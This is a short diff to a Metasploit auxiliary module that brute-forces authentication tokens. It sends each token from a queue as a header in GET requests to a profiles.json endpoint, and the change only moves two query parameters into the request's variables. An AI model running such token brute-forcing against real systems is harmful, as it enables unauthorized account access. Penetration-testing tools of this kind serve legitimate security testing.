@@ -121,12 +121,16 @@ class MetasploitModule < Msf::Auxiliary
     begin
       print_status("#{peer.strip} - Starting Brute-Forcer")
       token_queue.each do |token|
-        login_uri = normalize_uri(target_uri.path, '/profiles.json?recordstartindex=0&recordendindex=0')
+        login_uri = normalize_uri(target_uri.path, '/profiles.json')
         res = send_request_cgi({
           'uri' => login_uri,
           'method' => 'GET',
           'headers' => {
             'token' => token
+          },
+          'vars_get' => {
+            'recordstartindex' => '0',
+            'recordendindex' => '0'
           }
         })
 
